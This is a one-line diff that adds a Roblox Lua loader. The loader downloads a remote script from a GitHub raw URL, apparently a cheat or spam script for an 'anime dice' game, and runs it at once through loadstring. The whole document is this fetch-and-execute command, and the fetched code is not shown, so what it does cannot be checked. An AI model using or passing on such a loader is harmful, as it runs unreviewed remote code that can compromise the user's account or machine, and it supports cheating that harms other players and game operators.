@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/anime-dice-spam2-74vm2wt7okrwod.lua"))()
